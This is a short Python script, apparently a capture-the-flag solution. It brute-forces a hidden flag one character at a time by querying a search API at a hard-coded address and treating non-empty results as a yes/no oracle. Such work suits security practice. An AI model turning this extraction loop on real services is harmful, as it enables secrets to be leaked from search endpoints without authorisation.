import requests
import string

url = "http://34.134.162.213:17000/"

def search(s):
    search = url+"/api/search"
    json = { "query": s}
    resp = requests.post(search, json=json)
    return len(resp.json()["results"]) > 0 

print(search("L33"))

flag = "ett"
i=1
for _ in range(15):
    for c in string.printable:
        s = flag[i:]+c
        if search(s):
            print(s)
            flag += c
            i += 1
            break
print(flag)
        
        
